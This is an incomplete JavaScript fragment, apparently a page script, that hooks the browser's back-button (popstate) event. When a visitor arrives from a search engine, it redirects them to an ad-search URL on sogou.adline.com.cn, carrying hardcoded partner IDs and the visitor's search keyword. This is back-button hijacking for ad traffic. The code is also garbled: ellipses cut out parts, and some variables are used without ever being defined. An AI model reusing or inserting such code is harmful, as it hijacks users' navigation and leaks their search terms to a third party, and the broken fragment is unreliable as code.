(function() {
    var s_key = 'FFA1DYVO';
    var s_name = 'FP434V';
    var bd_arrs = ["1023685f"];
    var sg_name = "Sg";
    var sg_num = "sogou-mobb-1a3c31f4aad8845d";
    var sg_times = 30;
    var sg_regex = new RegExp('[\\?&]keyword=([^&#]*)');
    var sm_name = "Sm";
    var sm_arrs = ["wm828368"];
        ...
        window.addEventListener('popstate', function() {
            if (location.hash == '#!/xh') {
                ...
                if (ref.match(/(.*)sm.cn/g) && sm_regex.exec(ref) && ref.indexOf(sm_num) == -1) {
                    ...
                    href = "http://sogou.adline.com.cn/search?bid=d583013cadf68d5185c947733afc4702&keyword="+sg_regex.exec(ref)[1];
                    n = sg_name;
                    t = sg_times
